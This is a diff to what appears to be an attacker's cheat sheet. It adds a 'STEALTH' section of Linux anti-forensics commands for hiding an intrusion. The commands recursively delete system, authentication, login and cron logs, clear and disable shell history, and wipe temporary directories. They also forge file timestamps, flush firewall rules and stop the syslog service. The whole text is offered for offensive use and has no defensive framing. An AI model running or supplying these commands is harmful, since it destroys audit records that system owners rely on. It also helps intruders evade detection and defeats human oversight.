@@ -141,6 +141,50 @@ chmod +x /usr/bin/cp
 STEALTH
 ##########
 #clear logs
+rm -rf /var/log/*
+rm -rf /var/log/auth.log
+rm -rf /var/log/syslog
+rm -rf /var/log/messages
+rm -rf /var/log/httpd/access.log
+
+#delete cmd history
 echo "" > ~/.bash_history
 history -c && history -w
 > ~/.bash_history && history -c
+
+#disable history for active shell
+unset HISTFILE
+
+#delete tmp files
+rm -rf /tmp/*
+rm -rf /var/tmp/*
+rm -rf /dev/shm/*
+
+#set fake timestamps
+touch -mt YYYYMMDDHHMM /path/to/file
+
+#delete ssh logs
+rm -rf /var/log/wtmp   (last login)
+rm -rf /var/log/auth.log (auth attempts)
+
+#remove cron logs
+rm -rf /var/log/cron*
+
+#remove bash alias
+sed -i '/alias ls/d' ~/.bashrc
+unalias ls
+unalias -a
+
+#Clear network activity
+rm /path/to/downloaded_file
+iptables -F
+
+#disable logging / restart
+systemctl stop rsyslog
+service syslog stop
+systemctl start rsyslog
+service syslog start
+
+
+
+
